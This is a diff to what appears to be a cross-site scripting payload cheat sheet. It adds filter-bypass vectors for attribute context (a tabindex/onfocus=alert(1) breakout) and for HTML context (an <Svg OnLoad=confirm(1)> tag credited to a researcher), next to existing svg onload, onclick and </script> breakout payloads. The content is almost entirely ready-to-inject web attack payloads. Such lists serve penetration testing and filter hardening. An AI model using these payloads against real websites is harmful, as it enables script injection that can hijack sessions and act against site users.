@@ -32,6 +32,7 @@ something({"some/thing":{"key":[{"name":"</script ","age":"","country":"","addre
 
 For Attribute context use:
 ```
+bbbbb" id="bbbbb" Only=1 tabindex=1 onfocus=alert(1) a
 "><svg/oni=on onload=confirm(2)>
 '><svg/oni=on onload=confirm(2)>
 ```
@@ -44,6 +45,8 @@ cccc" oni=on onclick=print() dddd
 ### HTML Context
 
 * For HTML context use:
+
+`<Svg Only=1 OnLoad=confirm(1)>` Credits for XSS bypass in HTML context: [Brute Logic](https://twitter.com/brutelogic/status/1495769940615442434)
 
 `<svg/oni=on onload=confirm(2)>` Credits for XSS bypass in HTML context: [Troll_13](https://twitter.com/Troll_13/status/1353713311972552709)
 
